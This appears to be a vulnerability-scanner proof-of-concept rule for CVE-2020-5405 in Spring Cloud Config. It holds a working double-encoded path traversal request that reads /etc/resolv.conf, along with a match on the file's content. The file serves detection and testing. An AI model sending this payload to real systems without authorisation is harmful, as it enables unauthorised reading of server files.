name: poc-yaml-spring-cloud-cve-2020-5405
rules:
  - method: GET
    path: >-
      /a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/resolv.conf
    follow_redirects: true
    expression: |
      response.status == 200 && response.body.bcontains(bytes("This file is managed by man:systemd-resolved(8). Do not edit."))

detail:
  version: <= 2.1.6, 2.2.1
  author: kingkk(https://www.kingkk.com/)
  links:
    - https://pivotal.io/security/cve-2020-5405
    - https://github.com/spring-cloud/spring-cloud-config